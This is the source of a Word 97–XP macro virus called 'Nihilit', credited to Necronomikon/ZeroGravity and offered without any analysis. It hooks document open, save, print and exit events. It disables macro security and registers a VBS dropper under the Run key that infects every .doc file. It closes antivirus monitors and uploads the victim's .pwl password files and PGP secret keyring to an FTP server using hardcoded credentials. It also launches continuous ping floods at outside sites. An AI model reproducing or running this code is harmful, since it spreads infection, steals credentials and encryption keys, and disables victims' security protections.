Attribute VB_Name = "Nihilit
Sub AutoOpen()
    On Error Resume Next
    Call Nihilit
End Sub

Sub AutoClose()
    On Error Resume Next
    Call Nihilit
End Sub


Sub Nihilit()
On Error Resume Next
rem Win32/BAT/VBS/Word97-2K-XP.Nihilit
rem (c) by Necronomikon/ZeroGravity
rem -------------------------------------------
rem thanks jackie for some advanced code
    Word.Application.Options.VirusProtection = n
    Word.Application.Options.ConfirmConversions = n
    Word.Application.Options.SaveNormalPrompt = n
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End Select
WordBasic.DisableAutoMacros 0
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "vbsfile") = Environ("WINDIR") & "\Nihilit.vbs""
Open Environ("WINDIR") & "\Nihilit.vbs" For Output As #1
'Open "& w &\Nihilit.vbs" For Output As #1
Print #1, "rem VBS Backup for Nihilit by Necronomikon/ZeroGravity"
Print #1, "On Error Resume Next"
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = False"
Print #1, "Backup.Options.SaveNormalPrompt = False"
Print #1, "Set Search = Backup.Application.Filesearch"
Print #1, "Search.LookIn = ""C:\"": Search.SearchSubFolders = True: Search.FileName = ""*.doc"": Search.Execute"
Print #1, "For f = 1 To Search.FoundFiles.Count"
Print #1, "Victim = Search.FoundFiles(f)"
Print #1, "Backup.Documents.Open Victim"
Print #1, "Backup.ActiveDocument.Save"
Print #1, "Backup.ActiveDocument.Close"
Print #1, "Next"
Print #1, "Backup.Application.Quit"
Close #1
Call KillAV
Call Payload
Call Pgp
End Sub

Sub Payload()
On Error Resume Next
 With Application.FileSearch
.FileName = "*.pwl"
.LookIn = "c:"
.Execute
For I = 1 To .FoundFiles.Count
Shell "ftp.mitglied.lycos.de"
Shell "nihilit"
Shell "killer"
Shell "cd Incoming"
Shell "post" & .FoundFiles(I)
Shell "bye"
Next I
End With
End Sub

Sub ToolsMacro()
On Error Resume Next
End Sub

Sub FileTemplates()
On Error Resume Next
End Sub

Sub ViewVBCode()
On Error Resume Next
End Sub

Sub Pgp()
On Error Resume Next
'taken from WM97/Caligula by Opic[CodeBreakers]
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit") = False) Then

pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For I = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next I
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\windoze.vxd" For Output As #1
    Print #1, "ftp.mitglied.lycos.de"
    Print #1, "user nihilit"
    Print #1, "pass killer"
    Print #1, "cd Incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\windoze.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit") = True

End If

noPGP:
Shell " ping -l 5000 -t www.gmx.de", vbHide
Shell " ping -l 5000 -t www.symantec.com", vbHide
End Sub

Sub KillAV()
On Error Resume Next
'its better to close av-monitors instead of deleting its files!!!
For I = 1 to Tasks.Count
If ( Tasks.Item(I).Name = "AVP Monitor" ) Then Tasks.Item(I).Close 'window title(AVP)
If ( Tasks.Item(I).Name = "IKARUS Guard9x" ) Then Tasks.Item(I).Close 'Ikarus av
If ( Tasks.Item(I).Name = "MCAfee VShield" ) Then Tasks.Item(I).Close 'McAfee
If ( Tasks.Item(I).Name = "CLAW95" ) Then Tasks.Item(I).Close 'Norman Virus Control
If ( Tasks.Item(I).Name = "SCAN32" ) Then Tasks.Item(I).Close 'DR-Solomon
If ( Tasks.Item(I).Name = "FP-WIN" ) Then Tasks.Item(I).Close 'F-Prot
If ( Tasks.Item(I).Name = "VET95" ) Then Tasks.Item(I).Close 'InnoculateIT
If ( Tasks.Item(I).Name = "NAVAPW32" ) Then Tasks.Item(I).Close 'Norton
If ( Tasks.Item(I).Name = "SWEEP95" ) Then Tasks.Item(I).Close 'Sophos 
If ( Tasks.Item(I).Name = "IOMON98" ) Then Tasks.Item(I).Close 'PC-Cillin
If ( Tasks.Item(I).Name = "MONITOR" ) Then Tasks.Item(I).Close 'RAV
Next 
'Anti-AV from NTVCK
'Kill "C:\Progra~1\AntiViral Toolkit Pro\*.*"
'Kill "C:\Progra~1\Command Software\F-PROT95\*.*"
'Kill "C:\Progra~1\FindVirus\*.*"
'Kill "C:\Toolkit\FindVirus\*.*"
'Kill "C:\Progra~1\Quick Heal\*.*"
'Kill "C:\Progra~1\McAfee\VirusScan95\*.*"
'Kill "C:\Progra~1\Norton AntiVirus\*.*"
'Kill "C:\TBAVW95\*.*"
'Kill "C:\VS95\*.*"
'Kill "C:\eSafe\Protect\*.*"
'Kill "C:\PC-Cillin 95\*.*"
'Kill "C:\PC-Cillin 97\*.*"
'Kill "C:\f-macro\*.*"
'Kill "C:\Progra~1\FWIN32"
End Sub

Sub AutoExit()
    On Error Resume Next
    Call Nihilit
End Sub

Sub AutoExec()
    On Error Resume Next
    Call Nihilit
End Sub

Sub FileNew()
    On Error Resume Next
    Call Nihilit
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Nihilit
End Sub

Sub FileSave()
    On Error Resume Next
    Call Nihilit
    ActiveDocument.Save
End Sub

Sub FileClose()
    On Error Resume Next
    Call Nihilit
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub

Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call Nihilit
End Sub

Sub EditFind()
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
    Call Nihilit
End Sub

Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Nihilit
End Sub

Sub FilePrint()
    On Error Resume Next
Dialogs (wdDialogFilePrint).Show 
    Call Nihilit
End Sub

Sub FileExit()
    On Error Resume Next
    Call Nihilit
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub